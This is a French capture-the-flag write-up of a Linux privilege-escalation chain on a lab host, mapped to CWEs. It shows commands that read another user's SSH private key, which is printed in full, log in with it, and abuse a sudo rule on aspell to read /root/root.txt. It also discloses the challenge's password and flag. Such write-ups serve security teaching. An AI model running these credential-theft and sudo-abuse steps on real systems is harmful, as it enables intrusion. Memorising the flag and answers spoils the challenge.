# Write-up : "Yer a Wizard #2"

**Cible :** 10.10.0.5 (même machine que "Yer a Wizard, Harry!")

**Objectif :** Escalade de privilèges → root.txt

**Difficulté :** Medium

**Date :** 15/09/2026

**Techniques utilisées :** Abus de permissions de fichiers, décodage hexadécimal, appartenance à un groupe privilégié, vol de clé SSH privée, escalade via sudo (GTFOBins - aspell), décodage multi-couches (hex/Base64/Base32)

**Outils utilisés :** cat, chmod, xxd, find, getent, ssh, sudo, grep, base64, base32

**Prérequis :** accès SSH en tant que `hagrid` (obtenu dans le write-up "Yer a Wizard, Harry!").

---

## 1. Lecture d'un fichier protégé (abus de permission)

Sur le compte `hagrid`, un fichier `riddle.txt` est présent mais illisible. Comme on en est le propriétaire, on peut s'octroyer le droit de lecture :

```bash
ls -la
chmod u+r riddle.txt   # u = user (moi), r = droit de lecture
cat riddle.txt
```

**Résultat :**

```
Professor dumbledore gave me this riddle, but I don't think I can decipher this.
He said "take a crack at it, would you?" ...
```

suivi d'un gros bloc de lignes hexadécimales.

**Faille exploitée :** Mauvaise gestion des permissions — le propriétaire peut se redonner l'accès à un fichier "protégé" (CWE-732).

---

## 2. Décodage du riddle (hex → texte)

Parmi toutes les lignes hex, l'une décode en texte lisible :

```bash
echo '496e20666163742c2074686973207761732073696d706c652c207472756c792c207468652070617373776f72642069732042794d65726c696e4265617264210a' | xxd -r -p
```

**Résultat :**

```
In fact, this was simple, truly, the password is ByMerlinBeard!
```

→ mot de passe de **dumbledore** : `ByMerlinBeard!`

---

## 3. Énumération du groupe privilégié `headmaster`

```bash
id                                   # hagrid appartient au groupe headmaster
find / -group headmaster 2>/dev/null # fichiers appartenant à ce groupe
getent group headmaster              # membres du groupe → dumbledore
```

**Résultat :** le groupe `headmaster` donne accès aux répertoires `/home/dumbledore/.ssh` et `/home/hagrid/.ssh`, et le membre déclaré est `dumbledore` (uid 1003).

**Faille exploitée :** Groupe aux permissions trop larges donnant accès à des ressources sensibles (CWE-732).

---

## 4. Repérage d'une clé SSH lisible

```bash
ls -la /home/
# drwx------ dumbledore   (700)
# drwxr-xr-x hagrid
# drwx--x--x harry        (711)

ls -la /home/harry/.ssh/
# -rw-r--r-- 1 harry headmaster ... id_ed25519       ← clé privée lisible par tous !
# -rw-r--r-- 1 harry headmaster ... id_ed25519.pub
# -rw-r--r-- 1 harry headmaster ... authorized_keys
```

> `711` (`drwx--x--x`) : on peut **traverser** le dossier `harry` (bit `x`) même sans droit de lecture (`r`), ce qui permet d'atteindre `.ssh/` directement.

**Faille exploitée :** Clé privée SSH world-readable (CWE-732 / CWE-522 : Insufficiently Protected Credentials).

---

## 5. Vol de la clé privée de harry et connexion SSH

```bash
cat /home/harry/.ssh/id_ed25519
```

On recopie la clé dans un fichier local :

```bash
cat > /tmp/harry_key <<'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBsfpX7++1v80WmlMkgwbco1e4ESrTuBJW1kwPGbuG+UwAAAJjXKiQa1yok
GgAAAAtzc2gtZWQyNTUxOQAAACBsfpX7++1v80WmlMkgwbco1e4ESrTuBJW1kwPGbuG+Uw
AAAEAXghR8ct70B3lWRBxSLqDai2Q+wFphPdtXN5pYQ98QAWx+lfv77W/zRaaUySDBtyjV
7gRKtO4ElbWTA8Zu4b5TAAAAEmhhcnJ5QDVkOWU0NzZiMjg3YgECAw==
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 /tmp/harry_key      # ssh refuse une clé avec des permissions trop ouvertes
ssh -i /tmp/harry_key harry@localhost
```

- `-i` = utilise la clé au lieu d'un mot de passe.

**Résultat :** connexion réussie en tant que **harry** (`id` le confirme).

---

## 6. Escalade de privilèges via sudo (aspell)

```bash
sudo -l
```

**Résultat :**

```
User harry may run the following commands on hogwarts:
    (root) NOPASSWD: /usr/bin/aspell
```

→ on peut lancer `aspell` en **root** sans mot de passe.

**Faille exploitée :** Règle sudo permissive sur un binaire détournable (CWE-269 : Improper Privilege Management — technique GTFOBins).

`aspell` lit un fichier de config et affiche son contenu dans un message d'erreur → on lui fait lire `/root/root.txt` :

```bash
sudo aspell --conf /root/root.txt
# Error: /root/root.txt:1: The key "53565a4a...3d3d" is unknown.
```

→ une longue chaîne hexadécimale s'affiche.

---

## 7. Décodage du flag (hex → Base64 → Base32)

```bash
sudo aspell --conf /root/root.txt 2>&1 \
| grep -oE '[0-9a-f]{20,}' \
| xxd -r -p | base64 -d | base32 -d ; echo
```

- `2>&1` = récupère le message d'erreur
- `grep -oE '[0-9a-f]{20,}'` = extrait la longue chaîne hex
- `xxd -r -p` = hex → Base64
- `base64 -d` = Base64 → Base32
- `base32 -d` = Base32 → texte clair

**FLAG obtenu :**

```
EPI{t3H_tRuTh_1T_15_4_834ut1fUL_4nD_t3rr18L3_th1n9}
```

---

## Résumé des failles exploitées

| #   | Faille                                                  | Catégorie (CWE) |
| --- | ------------------------------------------------------ | --------------- |
| 1   | Fichier "protégé" modifiable par son propriétaire       | CWE-732         |
| 2   | Groupe `headmaster` aux permissions trop larges         | CWE-732         |
| 3   | Clé privée SSH world-readable                           | CWE-522         |
| 4   | Dossier en 711 traversable → accès direct à .ssh        | CWE-732         |
| 5   | sudo `NOPASSWD` sur `aspell` (GTFOBins)                 | CWE-269         |

---

## Chaîne d'exploitation (résumé visuel)

```
Compte hagrid → chmod u+r riddle.txt → décodage hex (mot de passe dumbledore)
        │
        ▼
Groupe headmaster → accès aux .ssh
        │
        ▼
Clé privée de harry lisible (id_ed25519)
        │
        ▼
ssh -i harry_key harry@localhost  → compte harry
        │
        ▼
sudo -l → (root) NOPASSWD: /usr/bin/aspell
        │
        ▼
sudo aspell --conf /root/root.txt → hex → base64 → base32 → FLAG root
```

---

## Conclusion

- **Point de départ :** compte `hagrid` (issu de "Yer a Wizard, Harry!").
- **Pivot 1 :** décodage d'un riddle hex → mot de passe, puis exploitation du groupe `headmaster` pour lire la clé SSH de `harry`.
- **Pivot 2 :** connexion SSH en `harry` via sa clé privée mal protégée.
- **Escalade root :** `sudo aspell` (GTFOBins) pour lire `/root/root.txt`, puis décodage hex/Base64/Base32.
- **Flag root :** `EPI{t3H_tRuTh_1T_15_4_834ut1fUL_4nD_t3rr18L3_th1n9}`
